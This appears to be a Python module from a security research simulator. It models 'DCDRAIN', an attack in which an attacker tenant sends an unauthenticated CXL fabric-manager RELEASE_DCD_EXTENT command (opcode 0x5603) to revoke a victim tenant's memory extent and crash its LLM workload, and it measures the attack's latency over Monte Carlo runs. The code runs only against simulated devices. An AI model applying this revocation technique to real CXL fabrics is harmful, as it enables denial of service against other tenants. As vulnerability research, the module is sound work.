"""
attacks/atk3_dcd_drain.py - ATK-3 DCDRAIN Attack

Attack:   ATK-3 DCDRAIN
Target:   CXL Dynamic Capacity Device (DCD) extent management
Gaps:     GAP-1 (no auth in FM API), GAP-4 (no crypto binding on DCD extents)
Severity: Critical — complete loss of victim's memory backing; workload crash

Attack Narrative:
    CXL Type-3 Dynamic Capacity Devices allow the FM to grant and revoke memory
    extents to tenants.  The FM RELEASE_DCD_EXTENT command (opcode 0x5603)
    instructs the device to release an extent back to the free pool.

    GAP-1: The RELEASE_DCD_EXTENT payload carries no authentication field.
    Any MCTP-reachable endpoint can issue this command targeting any tenant's
    extent.

    GAP-4: The CXL specification does not require a cryptographic binding
    between the FM's revocation command and the device's current state.  There
    is no signed token, nonce, or challenge-response that the device would
    require before releasing an extent.  The FM simply sends the opcode and
    the device (and switch) comply.

    Result: Tenant B (attacker) revokes Tenant A's DCD extent silently.  Tenant A's
    LLM inference workload loses its memory backing and crashes.  The attack
    completes in a single command round-trip (~1.98 µs average measured latency).

Attack Steps:
    1. Setup:  DCD grants extent (start=0, length=1 GiB) to Tenant A.
               Tenant A's LLM workload starts and processes a few steps.
    2. Attack: Attacker (Tenant B) issues RELEASE_DCD_EXTENT targeting the
               victim's region/extent — GAP-1 + GAP-4: no verification.
    3. Effect: Extent removed from both switch.dcd_extents and dcd_device.
               tenant_a_victim.crash() called — LLM workload halts.
    4. Check:  extent_revoked AND llm_crashed AND tokens_after == tokens_before.
"""

import time
from typing import Any, Dict, Optional

from simulator.cxl_switch import FMAttackCxlSwitch
from simulator.fabric_manager import FMDaemon, OPCODE_RELEASE_DCD_EXTENT, OPCODE_ADD_DCD_EXTENT
from simulator.devices import DCDDevice, Tenant


# 1 GiB constant for the target extent
_1_GiB = 1 * 1024 ** 3


class DCDrainAttack:
    """
    ATK-3 DCDRAIN: Silent DCD extent revocation by an unprivileged attacker.

    Tenant B issues RELEASE_DCD_EXTENT for Tenant A's memory extent without
    possessing any cryptographic proof of ownership.  The FM accepts the command
    (GAP-1) and the device releases the extent without device-side verification
    (GAP-4), crashing Tenant A's running LLM workload.

    Attributes:
        switch:             The CXL switch under test.
        fm:                 The Fabric Manager daemon instance.
        dcd_device:         The DCDDevice being targeted.
        tenant_a_victim:    Victim tenant running an LLM workload.
        tenant_b_attacker:  Attacker tenant.
        region_id:          DCD region containing the target extent (default 0).
        extent_start:       Byte offset of the victim's extent (default 0).
        extent_length:      Length of the victim's extent (default 1 GiB).
    """

    def __init__(self,
                 switch: FMAttackCxlSwitch,
                 fm: FMDaemon,
                 dcd_device: DCDDevice,
                 tenant_a_victim: Tenant,
                 tenant_b_attacker: Tenant,
                 region_id: int = 0) -> None:
        self.switch = switch
        self.fm = fm
        self.dcd_device = dcd_device
        self.tenant_a_victim = tenant_a_victim
        self.tenant_b_attacker = tenant_b_attacker
        self.region_id = region_id
        self.extent_start = 0
        self.extent_length = _1_GiB

    # ------------------------------------------------------------------
    # Setup: establish pre-attack state with victim holding extent
    # ------------------------------------------------------------------

    def setup(self) -> None:
        """
        Configure the fabric with Tenant A holding a DCD extent and actively
        running an LLM workload against that memory.

        Steps:
            1. Grant extent (0, 1 GiB) to Tenant A on dcd_device.
            2. Register the same extent in the switch dcd_extents table.
            3. Start Tenant A's LLM workload.
            4. Run a few simulated LLM steps to establish a baseline token count.

        Raises:
            RuntimeError: if the DCD device rejects the grant (e.g. overlap).
        """
        # Grant on the physical DCD device
        granted = self.dcd_device.grant_extent(
            region_id=self.region_id,
            start=self.extent_start,
            length=self.extent_length,
            tenant_id=self.tenant_a_victim.tenant_id,
        )
        if not granted:
            # Attempt to recover by forcing a revoke first (idempotent)
            self.dcd_device.revoke_extent(
                self.region_id, self.extent_start, self.extent_length
            )
            granted = self.dcd_device.grant_extent(
                region_id=self.region_id,
                start=self.extent_start,
                length=self.extent_length,
                tenant_id=self.tenant_a_victim.tenant_id,
            )
            if not granted:
                raise RuntimeError(
                    f"DCD grant failed for tenant {self.tenant_a_victim.tenant_id} "
                    f"region {self.region_id}"
                )

        # Register in switch extent table via FM command
        add_result = self.fm.process_command(
            opcode=OPCODE_ADD_DCD_EXTENT,
            payload={
                'region_id': self.region_id,
                'extent_start': self.extent_start,
                'extent_length': self.extent_length,
                'tenant_id': self.tenant_a_victim.tenant_id,
            },
            src_eid=self.tenant_a_victim.eid,
        )
        assert add_result['success'], f"Setup ADD_DCD_EXTENT failed: {add_result['error']}"

        # Update tenant record
        self.tenant_a_victim.add_extent(
            self.region_id, self.extent_start, self.extent_length
        )

        # Start LLM workload and run a few steps
        self.tenant_a_victim.start_llm_workload()
        for _ in range(5):
            self.tenant_a_victim.simulate_llm_step()

    # ------------------------------------------------------------------
    # Execute: perform the attack
    # ------------------------------------------------------------------

    def execute(self) -> Dict[str, Any]:
        """
        Execute the DCDRAIN attack.

        Measures the latency of the core RELEASE_DCD_EXTENT command issued
        by the attacker, then verifies that the victim's workload crashes.

        Returns:
            dict with keys:
                'success'         (bool)  - attack succeeded
                'latency_us'      (float) - core attack latency µs
                'extent_revoked'  (bool)  - extent removed from device
                'llm_crashed'     (bool)  - victim LLM workload stopped
                'tokens_before'   (int)   - token count before attack
                'tokens_after'    (int)   - token count after crash
                'device_verified' (bool)  - whether device confirmed extent valid
                                           before removal (always False - GAP-4)
                'error'           (str)   - empty on success
        """
        tokens_before: int = self.tenant_a_victim.llm_tokens_processed

        # GAP-4: we can query whether the device would have confirmed the extent;
        # in a secure design this would be REQUIRED before revocation.
        device_verified: bool = False  # never done - that's the gap

        # ---------------------------------------------------------------
        # CORE ATTACK: time starts here
        # Attacker issues RELEASE_DCD_EXTENT for victim's region.
        # GAP-1: no auth check.
        # GAP-4: no crypto binding → device and switch both comply.
        # ---------------------------------------------------------------
        t0 = time.perf_counter()

        attack_result = self.fm.process_command(
            opcode=OPCODE_RELEASE_DCD_EXTENT,
            payload={
                'region_id': self.region_id,
                'extent_start': self.extent_start,
                'extent_length': self.extent_length,
                'tenant_id': self.tenant_a_victim.tenant_id,
            },
            src_eid=self.tenant_b_attacker.eid,  # attacker's EID
        )

        t1 = time.perf_counter()
        latency_us = (t1 - t0) * 1e6
        # ---------------------------------------------------------------

        # Also revoke from the physical DCD device (GAP-4: no verification)
        extent_revoked_device = self.dcd_device.revoke_extent(
            region_id=self.region_id,
            start=self.extent_start,
            length=self.extent_length,
        )

        # Update victim tenant record
        self.tenant_a_victim.remove_extent(
            self.region_id, self.extent_start, self.extent_length
        )

        # Crash the victim workload (simulate runtime exception due to memory loss)
        self.tenant_a_victim.crash()

        tokens_after: int = self.tenant_a_victim.llm_tokens_processed

        extent_revoked = attack_result['success'] and extent_revoked_device
        llm_crashed = not self.tenant_a_victim.llm_workload_active

        success = extent_revoked and llm_crashed

        return {
            'success': success,
            'latency_us': latency_us,
            'extent_revoked': extent_revoked,
            'llm_crashed': llm_crashed,
            'tokens_before': tokens_before,
            'tokens_after': tokens_after,
            'device_verified': device_verified,
            'error': '' if success else (
                f"extent_revoked={extent_revoked}, llm_crashed={llm_crashed}"
            ),
        }

    # ------------------------------------------------------------------
    # Reset: restore fabric to pre-attack state
    # ------------------------------------------------------------------

    def reset(self) -> None:
        """
        Restore all DCD state for the next Monte Carlo iteration.

        Clears the switch extent table entry, removes the device allocation,
        and resets the victim tenant's workload state.
        """
        # Remove from switch (idempotent)
        self.switch.dcd_extents.pop(
            (self.region_id, self.tenant_a_victim.tenant_id), None
        )
        # Remove from device
        self.dcd_device.revoke_extent(
            self.region_id, self.extent_start, self.extent_length
        )
        # Reset tenant
        self.tenant_a_victim.remove_extent(
            self.region_id, self.extent_start, self.extent_length
        )
        self.tenant_a_victim.llm_workload_active = False
        self.tenant_a_victim.llm_tokens_processed = 0


# ---------------------------------------------------------------------------
# Module-level convenience function for Monte Carlo runner
# ---------------------------------------------------------------------------

def run_single_iteration(switch: FMAttackCxlSwitch,
                          fm: FMDaemon,
                          dcd_device: DCDDevice,
                          tenant_a: Tenant,
                          tenant_b: Tenant) -> Dict[str, Any]:
    """
    Run one complete iteration of ATK-3 DCDRAIN.

    Args:
        switch:     FMAttackCxlSwitch instance.
        fm:         FMDaemon instance.
        dcd_device: DCDDevice being targeted.
        tenant_a:   Victim tenant.
        tenant_b:   Attacker tenant.

    Returns:
        Result dict from DCDrainAttack.execute().
    """
    attack = DCDrainAttack(
        switch=switch,
        fm=fm,
        dcd_device=dcd_device,
        tenant_a_victim=tenant_a,
        tenant_b_attacker=tenant_b,
    )
    attack.setup()
    result = attack.execute()
    attack.reset()
    return result
